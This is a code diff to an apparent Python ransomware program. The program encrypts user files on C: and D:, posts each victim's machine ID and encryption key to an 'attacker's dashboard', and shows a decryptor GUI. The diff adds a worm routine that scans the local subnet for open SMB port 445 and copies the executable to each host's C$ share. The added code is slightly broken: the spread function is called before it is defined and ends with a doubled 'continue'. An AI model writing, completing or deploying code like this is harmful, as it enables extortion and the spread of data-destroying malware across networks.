@@ -19,6 +19,8 @@ import tkinter as tk
 from tkinter import filedialog, messagebox, simpledialog
 from tkinter import ttk
 from PIL import Image, ImageTk
+import socket
+import shutil
 
 # Step 1: Utility function to get the resource path
 def resource_path(relative_path):
@@ -32,7 +34,7 @@ def ensure_time_dir_exists():
 
 # Step 3: Function to load the machine id
 def load_machine_id():
-    drives = [f"{c}:\\" for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{c}:\\")]
+    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
     for drive in drives:
         machine_id_path = os.path.join(drive, "Machine_id.txt")
         if os.path.exists(machine_id_path):
@@ -63,7 +65,7 @@ DRIVES_TO_ENCRYPT = ['C:', 'D:']
 EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
 PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
 DASHBOARD_URL = 'http://localhost'
-MAX_ATTEMPTS = 10
+MAX_ATTEMPTS = 20
 DELAY = 5
 
 # Step 5: Setup logging
@@ -106,30 +108,6 @@ class EncryptionTool:
 
 # Part 3: File Encryption Functions
 
-    # Step 8: Function to set the wallpaper
-    def set_wallpaper(self, path):
-        try:
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
-            logging.info(f"Wallpaper set successfully to {path}.")
-        except Exception as e:
-            logging.error(f"Failed to set wallpaper: {str(e)}")
-    # Step 9: Function to create important files
-    def create_important_files(self, directory_path):
-        try:
-            d_data_path = os.path.join(directory_path, 'D-Data')
-            os.makedirs(d_data_path, exist_ok=True)
-
-            filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
-            file_contents = ['Annual Report Content', 'Financial Data', 'Employee Contact Information']
-
-            for filename, content in zip(filenames, file_contents):
-                file_path = os.path.join(d_data_path, filename)
-                with open(file_path, 'w') as file:
-                    file.write(content)
-
-            logging.info(f"Created important files in '{d_data_path}'.")
-        except Exception as e:
-            logging.error(f"Failed to create important files: {str(e)}")
 
     # Step 10: Function to encrypt a single file
     def encrypt_file(self, file_path):
@@ -181,50 +159,23 @@ Your Security Team
             logging.error(f"Failed to create user manual: {str(e)}")
 
     # Step 13: Function to send the encryption key to the dashboard
-    def send_key_to_dashboard(self):
-        encoded_key = base64.b64encode(self.key).decode('utf-8')
-        payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
+    def send_key_to_dashboard(self, machine_id, key, dashboard_url):
+        """Send the machine ID and encryption key to the attacker's dashboard."""
+        encoded_key = base64.b64encode(key).decode('utf-8')
+        payload = {'machine_id': machine_id, 'encryption_key': encoded_key}
         headers = {'Content-Type': 'application/json'}
-        for attempt in range(self.max_attempts):
-            logging.info(f"Attempt {attempt + 1} to send encryption key.")
-            try:
-                response = requests.post(self.dashboard_url, headers=headers, data=json.dumps(payload))
-                if response.ok:
-                    logging.info('Key sent successfully. Response OK.')
-                    return True
-                else:
-                    logging.error(f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
-            except requests.exceptions.ConnectionError as e:
-                logging.error(f"Connection error on attempt {attempt + 1}: {e}")
-            if attempt < self.max_attempts - 1:
-                time.sleep(self.delay)
-        logging.error("All attempts to send the key failed.")
-        return False
-
-    # Step 13.1: Function to save the encryption key locally
-    def save_key_locally(self):
-        key_path = os.path.join('E:', 'encryption_key.txt')
         try:
-            os.makedirs(os.path.dirname(key_path), exist_ok=True)
-            with open(key_path, 'w') as file:
-                file.write(f"Machine ID: {self.machine_id}\n")
-                file.write(f"Encryption Key: {base64.b64encode(self.key).decode('utf-8')}\n")
-            logging.info(f"Encryption key saved locally to {key_path}.")
-            return True
+            response = requests.post(dashboard_url, headers=headers, json=payload, timeout=10)
+            if response.ok:
+                logging.info('Key sent successfully to dashboard.')
+                return True
+            else:
+                logging.error(f'Failed to send key: {response.status_code} {response.text}')
+                return False
         except Exception as e:
-            logging.error(f"Failed to save encryption key locally: {str(e)}")
+            logging.error(f'Exception sending key to dashboard: {e}')
             return False
-        
-    # Step 14: Function to save the machine ID
-    def save_machine_id(self, directory_path):
-        machine_id_path = os.path.join(directory_path, "Machine_id.txt")
-        try:
-            os.makedirs(directory_path, exist_ok=True)
-            with open(machine_id_path, 'w') as file:
-                file.write(self.machine_id)
-            logging.info(f"Machine ID saved successfully to {machine_id_path}.")
-        except Exception as e:
-            logging.error(f"Failed to save Machine ID: {str(e)}")
+
 
     # Step 15: Function to process a drive (create files, encrypt, etc.)
     def process_drive(self, drive):
@@ -525,7 +476,7 @@ class DecryptorApp(tk.Tk):
         formatted_message = f"[{timestamp}] {message}"
         if self.winfo_exists():
             self.after(0, lambda: self._update_log_listbox(formatted_message, color))
-        # Step 34: Function to update the log listbox
+    # Step 34: Function to update the log listbox
     def _update_log_listbox(self, message, color):
         self.log_listbox.insert(tk.END, message)
         self.log_listbox.itemconfig(tk.END, {'fg': color})
@@ -601,7 +552,7 @@ class DecryptorApp(tk.Tk):
                     if f.endswith('.encrypted'):
                         encrypted_files.append(os.path.join(dp, f))
                         self.log(f"Found encrypted file: {os.path.join(dp, f)}")
-                total_files = len(encrypted_files)
+        total_files = len(encrypted_files)
         self.safe_update_progress(0, total_files)
         decrypted_count = 0
         for file_path in encrypted_files:
@@ -651,7 +602,7 @@ class DecryptorApp(tk.Tk):
         countdown_dialog = CountdownDialog(self, 15, self.close_application)
         countdown_dialog.grab_set()
         countdown_dialog.mainloop()
-        # Step 45: Function to close the application
+    # Step 45: Function to close the application
     def close_application(self):
         try:
             self.destroy()
@@ -816,12 +767,43 @@ if __name__ == "__main__":
     machine_id = load_machine_id()
 
     if machine_id:
-        #If Machine ID exists, skip encryption and launch Decryption GUI
         app = DecryptorApp()
         app.mainloop()
     else:
-        #If Machine ID does not exist, proceed with encryption process
         encryption_tool = EncryptionTool(DRIVES_TO_ENCRYPT, EXTENSIONS_TO_ENCRYPT, PASSWORD_PROVIDED, DASHBOARD_URL, MAX_ATTEMPTS, DELAY)
         encryption_tool.execute()
+        # Send key and machine ID to attacker dashboard
+        encryption_tool.send_key_to_dashboard(encryption_tool.machine_id, encryption_tool.key, DASHBOARD_URL)
+        # Auto-spread if port 445 is open on other hosts
+        ransomware_path = os.path.abspath(__file__)
+        scan_and_spread_smb(ransomware_path)
         app = DecryptorApp()
         app.mainloop()
+
+# Add SMB spreading function
+
+def scan_and_spread_smb(ransomware_path):
+    # Get local IP range
+    local_ip = socket.gethostbyname(socket.gethostname())
+    ip_parts = local_ip.split('.')
+    base_ip = '.'.join(ip_parts[:3])
+    for i in range(1, 255):
+        target_ip = f"{base_ip}.{i}"
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex((target_ip, 445))
+            sock.close()
+            if result == 0:
+                # Port 445 is open, try to copy ransomware
+                # Simulate copy to \\target_ip\C$\ransomware.exe
+                target_path = f"\\\\{target_ip}\\C$\\ransomware.exe"
+                try:
+                    shutil.copy(ransomware_path, target_path)
+                    logging.info(f"Spread ransomware to {target_path}")
+                except Exception as e:
+                    logging.warning(f"Failed to spread to {target_ip}: {e}")
+        except Exception:
+            continue
+            continue
+
